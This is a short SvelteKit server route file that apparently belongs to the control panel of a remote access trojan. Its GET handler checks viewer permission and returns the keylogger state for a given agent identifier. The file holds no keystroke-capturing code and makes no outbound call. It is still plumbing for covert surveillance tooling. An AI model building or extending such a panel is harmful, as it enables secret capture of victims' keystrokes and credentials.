import { json, error } from '@sveltejs/kit';
import type { RequestHandler } from './$types';
import { keyloggerManager } from '$lib/server/rat/keylogger';
import { requireViewer } from '$lib/server/authorization';

export const GET: RequestHandler = async ({ params, locals }) => {
	const id = params.id;
	if (!id) {
		throw error(400, 'Missing agent identifier');
	}

	requireViewer(locals.user);
	const state = await keyloggerManager.getState(id);
	return json(state);
};
